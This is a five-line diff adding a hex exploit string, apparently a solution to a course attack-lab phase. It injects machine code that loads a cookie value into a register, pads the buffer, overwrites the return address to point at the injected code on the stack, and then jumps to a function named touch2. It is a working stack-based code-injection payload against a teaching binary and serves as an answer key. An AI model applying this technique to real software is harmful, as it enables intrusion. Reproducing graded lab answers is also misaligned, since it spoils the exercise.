@@ -1,0 +1,5 @@
+48 c7 c7 48 8e ca 4b c3     /* assembly instructions to set my cookie */
+00 00 00 00 00 00 00 00     /* pad */
+00 00 00 00 00 00 00 00     /* pad */
+80 89 64 55 00 00 00 00     /* return address (%rsp) */
+2b 26 40 00 00 00 00 00     /* address of touch2 */
